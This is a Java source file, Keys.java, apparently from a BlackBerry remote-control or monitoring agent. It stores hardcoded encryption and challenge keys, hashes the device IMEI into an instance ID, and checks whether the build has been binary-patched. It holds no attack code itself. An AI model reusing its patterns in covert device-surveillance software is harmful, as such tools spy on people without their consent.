/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib 
 * File         : Keys.java 
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.config;

import net.rim.device.api.system.GPRSInfo;
import blackberry.crypto.Encryption;
import blackberry.interfaces.Singleton;
import blackberry.utils.Utils;

public final class Keys implements Singleton {
    private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
    private static String aes = "3j9WmmDgBqyU270FTid3719g64bP4s52"; // markup,
    // log
    private static String instanceID = "bg5etG87q20Kg52W5Fg1";
    private static String buildID = "av3pVck1gb4eR2d8";

    private static String challenge = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
    private static String confName = "c3mdX053du1YJ541vqWILrc4Ff71pViL"; // wchar

    private static byte[] byteAesKey;
    private static byte[] byteChallengeKey;
    private static byte[] byteConfKey;
    private static byte[] byteConfNameKey;
    private static byte[] byteInstanceID;

    static Keys instance = null;

    public static synchronized Keys getInstance() {
        if (instance == null) {
            instance = new Keys();
        }

        return instance;
    };

    public static boolean hasBeenBinaryPatched() {
        return !buildID.equals("av3pVck1gb4eR2d8");
    }

    private Keys() {
        final byte[] imei = GPRSInfo.getIMEI();
        byteInstanceID = Encryption.SHA1(imei);
        instanceID = Utils.byteArrayToHex(byteInstanceID);
    }

    public byte[] getAesKey() {
        if (byteAesKey == null) {
            byteAesKey = keyFromString(aes);
        }
        return byteAesKey;
    }

    public byte[] getBuildId() {
        return buildID.getBytes();
    }

    public byte[] getChallengeKey() {
        if (byteChallengeKey == null) {
            byteChallengeKey = keyFromString(challenge);
        }

        return byteChallengeKey;
    }

    public byte[] getConfKey() {
        if (byteConfKey == null) {
            byteConfKey = keyFromString(conf);
        }

        return byteConfKey;
    }

    public byte[] getConfNameKey() {
        if (byteConfNameKey == null) {
            byteConfNameKey = keyFromString(confName);
        }

        return byteConfNameKey;
    }

    public byte[] getInstanceId() {

        return byteInstanceID;
    }

    private byte[] keyFromString(final String string) {
        final byte[] key = new byte[16];
        Utils.copy(key, 0, string.getBytes(), 0, 16);
        return key;
    }

    public void setAesKey(final byte[] key) {
        byteAesKey = key;
    }

    public void setBuildID(final String build) {
        buildID = build;
    }

    public void setChallengeKey(final byte[] challenge_) {
        byteChallengeKey = challenge_;
    }

    public void setConfKey(final byte[] conf_) {
        byteConfKey = conf_;
    }

}
